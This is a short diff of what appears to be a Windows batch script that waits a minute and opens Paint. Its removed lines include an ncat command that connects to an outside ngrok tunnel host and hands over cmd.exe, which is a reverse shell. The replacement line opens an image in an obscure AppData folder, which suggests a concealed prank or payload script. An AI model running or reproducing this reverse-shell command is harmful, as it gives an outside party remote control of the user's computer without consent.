@@ -1,3 +1,2 @@
 timeout /t 60
-start mspaint.exe
-ncat 0.tcp.eu.ngrok.io 13508 -e cmd.exe
+start mspaint.exe C:\Users\User\AppData\Roaming\Microsoft\Windows\bba\superkek3000.png
